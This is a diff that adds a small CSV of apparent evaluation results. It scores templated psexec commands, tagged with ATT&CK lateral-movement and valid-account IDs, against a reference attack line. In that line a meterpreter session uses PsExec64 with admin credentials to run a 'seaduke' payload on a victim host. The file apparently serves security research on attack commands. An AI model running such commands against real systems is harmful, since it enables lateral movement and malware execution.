@@ -1,0 +1,7 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_psexec_TA0003_T1078.txt,psexec,psexec -u <domain_admin_account> -p <password> \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.336,True
+command_psexec_TA0003_T1078.txt,psexec,psexec -u <local_admin_account> -l \\remote_system -w <working_directory>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.142,True
+command_psexec_TA0003_T1078.txt,psexec,"psexec -u <service_account> -n 30 \\remote_system -r ""Remote_Service""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.178,True
